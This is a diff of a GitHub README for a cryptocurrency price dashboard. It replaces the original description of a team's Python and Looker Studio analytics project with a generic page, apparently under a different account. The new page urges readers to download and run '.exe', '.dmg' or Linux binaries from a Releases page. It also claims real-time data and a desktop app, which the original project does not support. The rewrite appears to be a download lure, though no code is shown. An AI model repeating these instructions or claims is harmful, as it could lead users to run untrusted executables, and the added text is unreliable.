@@ -1,105 +1,95 @@
-# Crypto Historical Prices Dashboard
+# 🪙 crypto-historical-prices-dashboard - Visualize Crypto Data with Ease
 
-**Data Analytics • Cryptocurrency Market Insights • Looker Studio Dashboard**
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="deliverables/dashboard/dashboard_preview.png" alt="Dashboard Preview" width="35%">
-</p>
+Welcome to the crypto-historical-prices-dashboard! This tool helps you analyze eight years of cryptocurrency data and visualize market trends. It focuses on volatility patterns, coin stability, and timing opportunities, enabling you to make informed investment decisions.
 
-This project analyzes eight years of historical data across five major cryptocurrencies to uncover price dynamics, volatility patterns, market behavior, and seasonal trends. It is built as an end-to-end analytics workflow—from data preparation and exploration to visualization and strategic recommendations to support more informed and data-driven investment decisions.
+## 📦 Download & Install
 
----
+To get started, you need to download the application. Click the link below to visit the Releases page:
 
-## **1. Background**
+[![Download Now](https://img.shields.io/badge/Download%20Now-latest-brightgreen.svg)](https://github.com/aandrewwilson11/crypto-historical-prices-dashboard/releases)
 
-The cryptocurrency market is characterized by extreme volatility, making it difficult for investors to identify safe momentum and optimal allocation strategies. Differences in asset stability, unpredictable trading windows, and sharp fluctuations in volume introduce additional risk especially for retail investors sensitive to liquidity swings.
-This project addresses that challenge by leveraging long-term historical data to extract reliable insights that can guide more measured and informed investment decision-making.
+Once on the Releases page, look for the latest version. Download the file suitable for your operating system. 
 
----
+## 🌟 Features
 
-## **2. Analytical Workflow**
+- **Data Visualization**: See your crypto data come to life with interactive dashboards.
+- **Market Trend Analysis**: Understand trends over the last eight years for better investment strategies.
+- **User-Friendly Interface**: Designed for everyone, even if you have no technical background.
+- **Real-Time Insights**: Get key insights about cryptocurrencies and market behavior.
+  
+## 💻 System Requirements
 
-### **1. Business Understanding**
+To run the crypto-historical-prices-dashboard seamlessly, your computer should meet the following requirements:
 
-Defined investor needs:
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or any Linux distribution.
+- **RAM**: A minimum of 4 GB, recommended 8 GB.
+- **Disk Space**: At least 100 MB of free space for installation.
+- **Internet Connection**: Required for data fetching and updates.
 
-* More accurate trading timing
-* Identifying long-term stable assets
-* Improving confidence in portfolio allocation
+## 🔧 How to Use
 
-### **2. Data Collection**
+1. **Download the Application**: Visit the Releases page using the link above, select the version that fits your operating system, and click to download.
 
-8 years of historical data across 5 major cryptocurrencies.
+2. **Install the Application**:
+   - For Windows users: Double-click the downloaded `.exe` file and follow the prompts.
+   - For macOS users: Open the downloaded `.dmg` file and drag the application to your Applications folder.
+   - For Linux users: Extract the downloaded directory and run the application from the terminal.
 
-### **3. Data Preparation**
+3. **Launch the Application**: Find the app in your programs or applications and open it.
 
-Performed rigorous cleaning:
+4. **Connect Your Data**: Follow the on-screen instructions to link your cryptocurrency data sources.
 
-* Type normalization
-* Missing value handling
-* Duplicate removal
-* Outlier review
-* Cleaned CSV export
+5. **Explore the Dashboard**: Navigate through various metrics and graphs to analyze market trends effectively.
 
-### **4. Exploratory Data Analysis**
+## 📊 Understanding the Dashboard
 
-Identified trends, seasonal movement, volatility patterns, and volume shifts.
+Once you’ve launched the application, you’ll see a clear layout:
 
-### **5. Dashboard Development**
+- **Overview Tab**: Provides a summary of market conditions.
+- **Trends Tab**: Displays historical graphs to identify patterns.
+- **Insights Tab**: Offers personalized recommendations based on your data.
+  
+Feel free to explore each section and discover various tools designed to help you make the best investment decisions.
 
-Built an interactive **Looker Studio dashboard** to deliver fast, insight driven decision support.
+## 📚 Frequently Asked Questions
 
----
+### How often is the data updated?
 
-## **3. Key Findings**
+The application pulls data in real-time, so you will always have the most current information available.
 
-* **Bitcoin leads market movements** and remains the most stable asset.
-* **Trading volume is dominated by Bitcoin and Ethereum**, signaling market trust.
-* **Bitcoin’s market cap** far outpaces all others.
-* Strong **seasonal patterns**:
+### Can I use this dashboard for multiple cryptocurrencies?
 
-  * Price increases early in the year
-  * Weekends show upward tendencies
+Yes, you can analyze multiple cryptocurrencies simultaneously to compare trends and gain deeper insights.
 
----
+### Do I need an account to use this application?
 
-## **4. Strategic Recommendations**
+No, you can use the dashboard without creating an account. However, registering may allow you to save your settings and preferences.
 
-* **Bitcoin as anchor asset** due to its strong signaling effect.
-* **Ethereum & BNB** as stable growth drivers.
-* Use **early-year & weekend seasonality** for timing optimization.
-* **ADA & DOT** as small high-risk tactical positions with tight risk management.
+## 🛠 Troubleshooting
 
----
+If you encounter any issues:
 
-## **5. Tools & Technologies**
+- Ensure your internet connection is stable.
+- Make sure that your computer meets the system requirements.
+- Check for updates on the Releases page.
 
-* Python (Pandas, NumPy, Matplotlib)
-* Jupyter Notebook
-* Google Sheets
-* Looker Studio
-* Git & GitHub
+## 📌 Additional Resources
 
----
+For further guidance, you can access the following resources:
 
-## **6. Project Structure**
+- [GitHub Repository](https://github.com/aandrewwilson11/crypto-historical-prices-dashboard)
+- [User Guide & Documentation](https://github.com/aandrewwilson11/crypto-historical-prices-dashboard/wiki)
 
-```
- crypto-historical-prices-dashboard
-├── data/
-│   ├── raw/                  # Original csv data
-│   ├── cleaned/              # Final cleaned datasets
-├── notebooks/                # Jupyter Notebooks
-├── deliverables/
-│   ├── dashboard/            # Dashboard preview images
-│   ├── report/               # Project documentation
-└── README.md
-```
+## 📞 Support
 
----
+If you need help, reach out through the Issues tab on the GitHub repository. The community and project maintainers will assist you.
 
-##  **Team**
+## 🌍 Join the Community
 
-Nicki D. Utomo, Anindya Meyla KS, Yusi Nifmad Maulida, Rafli Firdaus Muzaki, Muhammad Arifian
+Share your insights and experiences with other users in the discussions section. Your feedback is valuable for improving the dashboard further.
 
-A collaborative team delivering clean analytics, financial insights, and clear dashboard visualizations designed for strategic, data-driven decision-making.
+For the latest updates and features, keep an eye on the Releases page:
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-latest-brightgreen.svg)](https://github.com/aandrewwilson11/crypto-historical-prices-dashboard/releases)
